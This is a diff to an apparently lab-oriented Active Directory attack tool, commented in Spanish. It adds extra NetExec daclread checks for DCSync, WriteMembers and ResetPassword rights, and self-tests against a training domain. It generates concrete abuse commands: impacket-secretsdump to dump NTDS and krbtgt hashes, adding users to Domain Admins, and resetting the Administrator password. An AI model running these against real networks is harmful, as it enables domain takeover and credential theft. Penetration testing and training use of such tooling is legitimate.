@@ -6971,10 +6971,17 @@ _ACL_HV_GROUPS = ("Domain Admins", "Enterprise Admins", "Administrators")
 # --groups y luego auditar cada miembro) — queda como mejora futura documentada.
 _ACL_HV_ACCOUNTS = ("Administrator",)
 # Derechos de una ACE que dan CONTROL del objeto (o permiten meter miembros en un grupo) → abuso.
-# Nombres EXACTOS como los imprime daclread (ACCESS_MASK/SIMPLE_PERMISSIONS de nxc): 'WriteDACL'
-# (no 'WriteDacl'), 'GenericAll', etc.
+# Nombres EXACTOS como los imprime daclread (ACCESS_MASK/SIMPLE_PERMISSIONS/
+# ALLOWED_OBJECT_ACE_MASK_FLAGS de nxc/modules/daclread.py): 'WriteDACL' (no 'WriteDacl'),
+# 'GenericAll', etc.
+# OJO: en un ACE OBJETO-ESPECÍFICO (ACCESS_ALLOWED_OBJECT_ACE — el que lleva un ObjectType GUID
+# concreto, como WriteMembers aislado o ResetPassword), nxc imprime la máscara con los nombres de
+# ALLOWED_OBJECT_ACE_MASK_FLAGS, que son SINGULARES: 'WriteProperty' (no 'WriteProperties'),
+# 'ReadProperty', etc. Un principal con solo WriteMembers (0x20 limitado al atributo 'member' por
+# el GUID) se imprime como 'Access mask : WriteProperty' → palantir perdía ese hallazgo buscando
+# el plural. Ambos nombres entran en la lista.
 _ACL_DANGEROUS_RIGHTS = ("GenericAll", "FullControl", "WriteDACL", "WriteOwner",
-                         "GenericWrite", "WriteProperties", "Self")
+                         "GenericWrite", "WriteProperties", "WriteProperty", "Self")
 _DACLREAD_MASK_RE = re.compile(r"Access mask\s*:\s*(.+)", re.I)
 _DACLREAD_ACE_RE = re.compile(r"ACE\[\d+\] info")
 
@@ -7063,31 +7070,69 @@ def _surface_acl_abuse(res, nxc, ip, u, secret, is_hash, domain, base_dn, auth_a
     def _m(o):   # enmascara el secreto en la salida guardada (igual que mask() de _creds_enum)
         return o.replace(secret, "***") if (secret and not is_hash) else o
     # 1) DCSync: ¿derecho de replicación sobre el dominio?
+    # Dos pasadas: (a) con RIGHTS=DCSync filtra por el GUID específico DS_Replication_Get_Changes_All
+    # (nxc/modules/daclread.py:456) y detecta el ACE objeto-específico típico; (b) SIN filtro de
+    # rights, un principal con GenericAll/WriteDACL sobre el PROPIO DOMINIO también implica DCSync
+    # (mismas primitivas RBCD/SeEnableDelegation…) pero la primera pasada NO lo detecta porque esos
+    # ACEs no llevan el GUID DCSync — se perdía en silencio este vector real.
     rc, out = _dacl([f"TARGET_DN={base_dn}", f"PRINCIPAL={u}", "RIGHTS=DCSync", "ACTION=read"])
     _step(res, f"{nxc} ldap {ip} {shown_auth} -M daclread -o TARGET_DN={base_dn} PRINCIPAL={u} RIGHTS=DCSync",
           _daclread_has_ace(out), _m(out),
           note="¿esta credencial tiene DS-Replication-Get-Changes[-All] sobre el dominio? → DCSync viable YA "
                "(volcar todos los hashes sin ser admin)")
+    dcsync_viable = _daclread_has_ace(out)
+    # 1b) GenericAll/WriteDACL/WriteOwner sobre el dominio raíz (sin filtrar por GUID): implica
+    # DCSync + reset de cualquier usuario (incluido krbtgt). Caso real que la pasada anterior se saltaba.
+    rc2, out2 = _dacl([f"TARGET_DN={base_dn}", f"PRINCIPAL={u}", "ACTION=read"])
+    _step(res, f"{nxc} ldap {ip} {shown_auth} -M daclread -o TARGET_DN={base_dn} PRINCIPAL={u}",
+          bool(_parse_daclread_rights(out2)), _m(out2),
+          note="¿esta credencial tiene control abusable (GenericAll/WriteDACL/WriteOwner) sobre el dominio raíz? → DCSync IMPLÍCITO + reset de cualquier usuario (krbtgt incluido)")
+    dom_rights = _parse_daclread_rights(out2)
+    if dom_rights and not dcsync_viable:
+        # GenericAll/FullControl/WriteDACL sobre el dominio IMPLICAN la capacidad de DCSync aunque
+        # el ACE no lleve el GUID DS-Replication-Get-Changes-All (podrías darte el right primero, o
+        # resetearle la contraseña a krbtgt y falsificar tickets). El operador debe confirmarlo a mano.
+        if any(r in dom_rights for r in ("GenericAll", "FullControl", "WriteDACL", "WriteOwner")):
+            dcsync_viable = True
     _dcsync_txt = (f"AD (cred {u}): DCSync viable — «{u}» tiene DS-Replication-Get-Changes-All sobre el dominio → "
                    "volcar TODOS los hashes del dominio (krbtgt incluido) sin ser Domain Admin")
-    if _daclread_has_ace(out) and _add_once(res, "critica", _dcsync_txt, "DCSync viable", seen):
+    if dcsync_viable and _add_once(res, "critica", _dcsync_txt, "DCSync viable", seen):
+        # impacket-secretsdump: formato de auth DISTINTO según sea pass-the-hash o contraseña (antes
+        # siempre salía 'user:***@ip', inválido con -H). Hash → '-hashes :<nt>' + 'user@ip'; contraseña → 'user:***@ip'.
+        if is_hash:
+            auth_sd = f"-hashes :*** {domain}/{shlex.quote(u)}@{ip}"
+        else:
+            auth_sd = f"{domain}/{shlex.quote(u)}:***@{ip}"
         _attach_cmd(res, _dcsync_txt, [
-            f"impacket-secretsdump -just-dc {domain}/{shlex.quote(u)}:***@{ip}   # DCSync confirmado arriba: "
+            f"impacket-secretsdump -just-dc {auth_sd}   # DCSync confirmado arriba: "
             "vuelca el NTDS entero (añade '-just-dc-user krbtgt' para solo la krbtgt → Golden Ticket)"])
-    # 2) Control abusable sobre grupos de alto valor
+    # 2) Control abusable sobre grupos de alto valor: dos pasadas, una sin filtro (detecta
+    # GenericAll/WriteDACL/WriteOwner/GenericWrite/WriteProperties) y otra con RIGHTS=WriteMembers
+    # (detecta el right OBJETO-ESPECÍFICO para añadir miembros — un principal con SOLO WriteMembers
+    # puede 'bloodyAD add groupMember' igual, pero su ACE no lleva los derechos genéricos y se
+    # perdía). nxc acepta RIGHTS=WriteMembers (nxc/modules/daclread.py:234, confirmado contra fuente).
     for grp in _ACL_HV_GROUPS:
         rc, out = _dacl([f"TARGET={grp}", f"PRINCIPAL={u}", "ACTION=read"])
         rights = _parse_daclread_rights(out)
         _step(res, f"{nxc} ldap {ip} {shown_auth} -M daclread -o TARGET={shlex.quote(grp)} PRINCIPAL={u}",
               bool(rights), _m(out),
               note=f"¿esta credencial tiene control abusable (GenericAll/WriteDACL/WriteOwner/…) sobre '{grp}'? → escalada directa a Domain Admin")
+        # 2b) pasada específica para WriteMembers aislado (right GUID-específico sobre el atributo 'member'):
+        rc_wm, out_wm = _dacl([f"TARGET={grp}", f"PRINCIPAL={u}", "RIGHTS=WriteMembers", "ACTION=read"])
+        _step(res, f"{nxc} ldap {ip} {shown_auth} -M daclread -o TARGET={shlex.quote(grp)} PRINCIPAL={u} RIGHTS=WriteMembers",
+              _daclread_has_ace(out_wm), _m(out_wm),
+              note=f"¿la credencial tiene WriteMembers (right GUID-específico) sobre '{grp}'? → añadir miembros directamente")
+        if _daclread_has_ace(out_wm) and "WriteMembers" not in rights:
+            rights = rights + ["WriteMembers"]   # bandera para _acl_abuse_cmds (add groupMember directo, 1 paso)
         _grp_txt = (f"AD (cred {u}): «{u}» tiene {', '.join(rights)} sobre '{grp}' → escalada DIRECTA a {grp} "
                     "(meterse en el grupo) — la ruta que normalmente hay que buscar con BloodHound a mano")
         if rights and _add_once(res, "critica", _grp_txt, f"ACL {grp}", seen):
             _attach_cmd(res, _grp_txt, _acl_abuse_cmds(rights, grp, u, secret, is_hash, domain, ip))
     # 3) Control abusable sobre CUENTAS de alto valor (no solo grupos): con control sobre la
     # propia cuenta 'Administrator' no hace falta meterte en ningún grupo, le reseteas la
-    # contraseña y entras directamente como ella.
+    # contraseña y entras directamente como ella. Pasada adicional con RIGHTS=ResetPassword
+    # para detectar el right GUID-específico de reset (nxc:234), que un principal puede tener sin
+    # GenericAll — antes se perdía.
     for acc in _ACL_HV_ACCOUNTS:
         rc, out = _dacl([f"TARGET={acc}", f"PRINCIPAL={u}", "ACTION=read"])
         rights = _parse_daclread_rights(out)
@@ -7095,6 +7140,12 @@ def _surface_acl_abuse(res, nxc, ip, u, secret, is_hash, domain, base_dn, auth_a
               bool(rights), _m(out),
               note=f"¿esta credencial tiene control abusable (GenericAll/WriteDACL/WriteOwner/…) sobre la CUENTA "
                    f"'{acc}'? → resetarle la contraseña y entrar directamente como ella, sin pasar por ningún grupo")
+        rc_rp, out_rp = _dacl([f"TARGET={acc}", f"PRINCIPAL={u}", "RIGHTS=ResetPassword", "ACTION=read"])
+        _step(res, f"{nxc} ldap {ip} {shown_auth} -M daclread -o TARGET={shlex.quote(acc)} PRINCIPAL={u} RIGHTS=ResetPassword",
+              _daclread_has_ace(out_rp), _m(out_rp),
+              note=f"¿la credencial tiene ResetPassword (right GUID-específico) sobre '{acc}'? → reset directo")
+        if _daclread_has_ace(out_rp) and "ResetPassword" not in rights:
+            rights = rights + ["ResetPassword"]   # bandera para _acl_abuse_cmds (set password directo)
         _acc_txt = (f"AD (cred {u}): «{u}» tiene {', '.join(rights)} sobre la cuenta '{acc}' → resetear su "
                     "contraseña DIRECTAMENTE y entrar como ella (no hace falta meterse en ningún grupo)")
         if rights and _add_once(res, "critica", _acc_txt, f"ACL cuenta {acc}", seen):
@@ -10792,6 +10843,106 @@ def selftest():
     assert "bloodyAD --host 172.16.7.3 -d inlanefreight.local" in _acl_next
     assert "add groupMember 'Domain Admins' CT059" in _acl_next and "net rpc" not in _acl_next
     assert "set password Administrator 'NuevaPass123!'" in _acl_next   # cadena de abuso de la cuenta, 2 pasos (WriteDACL)
+
+    # ── Slice acl-audit (bugs encontrados a mano, workflow failed) ─────────────────────────────
+    # BUG: _parse_daclread_rights reconoce 'WriteProperty' singular (ALLOWED_OBJECT_ACE_MASK_FLAGS
+    # de nxc) además del plural 'WriteProperties' (SIMPLE_PERMISSIONS/ACCESS_MASK). Un principal con
+    # SOLO WriteMembers sobre 'Domain Admins' se imprime como 'Access mask : WriteProperty'
+    # (right OBJETO-ESPECÍFICO con GUID del atributo 'member') y palantir lo perdía.
+    _dacl_wp_sing = ("LDAP x 389 DC ACE[3] info\n"
+                     "LDAP x 389 DC \tAccess mask               : WriteProperty\n"
+                     "LDAP x 389 DC \tObject type (GUID)        : Member (bf9679c0-0de6-11d0-a285-00aa003049e2)")
+    assert "WriteProperty" in _parse_daclread_rights(_dacl_wp_sing), _parse_daclread_rights(_dacl_wp_sing)
+
+    # BUG: impacket-secretsdump del hallazgo DCSync usa el formato correcto en pass-the-hash.
+    # Antes siempre decía 'user:***@ip', inválido con -H. Hash → '-hashes :***' + 'user@ip'.
+    _real_rcr_acl2 = _run_capture_retry
+
+    def _fake_daclread_dcsync_hash(cmd, timeout=None, quiet=False, **kw):
+        s = " ".join(cmd)
+        if "RIGHTS=DCSync" in s:
+            return 0, ("LDAP x 389 DC ACE[0] info\nLDAP x 389 DC \tAccess mask : ControlAccess\n"
+                       "LDAP x 389 DC \tObject type (GUID) : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n"
+                       "LDAP x 389 DC \tTrustee (SID) : DOM\\CT059 (S-1-5-21-1130)")
+        return 0, "LDAP x 389 DC [*] sin ACE"
+    globals()["_run_capture_retry"] = _fake_daclread_dcsync_hash
+    _acl_h = _fp("reuse-ldap", "x", [389])
+    try:
+        _surface_acl_abuse(_acl_h, "FAKE_NXC", "172.16.7.3", "CT059", "aad3...:abcd1234", True,
+                           "inlanefreight.local", "dc=inlanefreight,dc=local",
+                           ["-u", "CT059", "-H", "aad3...:abcd1234"], "-u CT059 -H '***'", set())
+    finally:
+        globals()["_run_capture_retry"] = _real_rcr_acl2
+    _acl_h_next = " ".join(_acl_h["next"])
+    assert "-hashes :***" in _acl_h_next, _acl_h_next
+    assert "CT059@172.16.7.3" in _acl_h_next, _acl_h_next
+    assert "CT059:***@172.16.7.3" not in _acl_h_next, _acl_h_next   # formato viejo (incorrecto con hash) ya no sale
+
+    # BUG: GenericAll sobre el DOMINIO raíz (sin ACE con GUID DCSync) también implica DCSync — la
+    # primera pasada con RIGHTS=DCSync no lo detecta (filtra por GUID), la 2a sin filtro sí. Caso real.
+    _real_rcr_acl3 = _run_capture_retry
+
+    def _fake_daclread_domain_ga(cmd, timeout=None, quiet=False, **kw):
+        s = " ".join(cmd)
+        if "TARGET_DN=dc=inlanefreight,dc=local" in s and "RIGHTS=DCSync" not in s:
+            # ACE normal (NO objeto-específico): GenericAll sobre el dominio → DCSync implícito
+            return 0, ("LDAP x 389 DC ACE[0] info\nLDAP x 389 DC \tAccess mask : GenericAll\n"
+                       "LDAP x 389 DC \tTrustee (SID) : DOM\\CT059 (S-1-5-21-1130)")
+        return 0, "LDAP x 389 DC [*] sin ACE"   # el filtro DCSync (específico del GUID) NO casa
+    globals()["_run_capture_retry"] = _fake_daclread_domain_ga
+    _acl_d = _fp("reuse-ldap", "x", [389])
+    try:
+        _surface_acl_abuse(_acl_d, "FAKE_NXC", "172.16.7.3", "CT059", "p", False,
+                           "inlanefreight.local", "dc=inlanefreight,dc=local",
+                           ["-u", "CT059"], "-u CT059 -p '***'", set())
+    finally:
+        globals()["_run_capture_retry"] = _real_rcr_acl3
+    assert any("DCSync viable" in t for s, t in _acl_d["findings"] if s == "critica"), _acl_d["findings"]
+
+    # BUG: WriteMembers aislado sobre Domain Admins (right GUID-específico sin GenericAll) también
+    # se detecta — la pasada normal no lo pilla (ACE objeto-específico con nombres singulares), la 2a
+    # pasada con RIGHTS=WriteMembers sí. nxc confirmado en nxc/modules/daclread.py:234.
+    _real_rcr_acl4 = _run_capture_retry
+
+    def _fake_daclread_wm(cmd, timeout=None, quiet=False, **kw):
+        s = " ".join(cmd)
+        if "TARGET=Domain Admins" in s and "RIGHTS=WriteMembers" in s:
+            return 0, ("LDAP x 389 DC ACE[1] info\nLDAP x 389 DC \tAccess mask : WriteProperty\n"
+                       "LDAP x 389 DC \tObject type (GUID) : Member (bf9679c0-...)\n"
+                       "LDAP x 389 DC \tTrustee (SID) : DOM\\CT059 (S-1-5-21-1130)")
+        return 0, "LDAP x 389 DC [*] sin ACE"
+    globals()["_run_capture_retry"] = _fake_daclread_wm
+    _acl_wm = _fp("reuse-ldap", "x", [389])
+    try:
+        _surface_acl_abuse(_acl_wm, "FAKE_NXC", "172.16.7.3", "CT059", "p", False,
+                           "inlanefreight.local", "dc=inlanefreight,dc=local",
+                           ["-u", "CT059"], "-u CT059 -p '***'", set())
+    finally:
+        globals()["_run_capture_retry"] = _real_rcr_acl4
+    assert any("Domain Admins" in t and "WriteMembers" in t for s, t in _acl_wm["findings"] if s == "critica"), _acl_wm["findings"]
+
+    # BUG: ResetPassword aislado sobre la cuenta 'Administrator' (right GUID-específico, sin
+    # GenericAll) → debe detectarse con la 2a pasada RIGHTS=ResetPassword. Es la ruta real del fix.
+    _real_rcr_acl5 = _run_capture_retry
+
+    def _fake_daclread_rp(cmd, timeout=None, quiet=False, **kw):
+        s = " ".join(cmd)
+        if "TARGET=Administrator" in cmd and "RIGHTS=ResetPassword" in s:
+            return 0, ("LDAP x 389 DC ACE[2] info\nLDAP x 389 DC \tAccess mask : ControlAccess\n"
+                       "LDAP x 389 DC \tObject type (GUID) : User-Force-Change-Password (...)\n"
+                       "LDAP x 389 DC \tTrustee (SID) : DOM\\CT059 (S-1-5-21-1130)")
+        return 0, "LDAP x 389 DC [*] sin ACE"
+    globals()["_run_capture_retry"] = _fake_daclread_rp
+    _acl_rp = _fp("reuse-ldap", "x", [389])
+    try:
+        _surface_acl_abuse(_acl_rp, "FAKE_NXC", "172.16.7.3", "CT059", "p", False,
+                           "inlanefreight.local", "dc=inlanefreight,dc=local",
+                           ["-u", "CT059"], "-u CT059 -p '***'", set())
+    finally:
+        globals()["_run_capture_retry"] = _real_rcr_acl5
+    _acl_rp_crit = [t for s, t in _acl_rp["findings"] if s == "critica"]
+    assert any("Administrator" in t and "ResetPassword" in t for t in _acl_rp_crit), _acl_rp_crit
+    assert any("set password Administrator" in n for n in _acl_rp["next"])
     # _secretsdump_hash: DCSync-rights check (secretsdump.py -just-dc-user krbtgt) — mismo
     # formato 'usuario:RID:lm:nt:::' que _parse_nxc_sam; sin derechos, la cuenta pedida NUNCA
     # aparece en la salida (se queda en el error RPC de la fase DRSUAPI, no en una línea vacía).
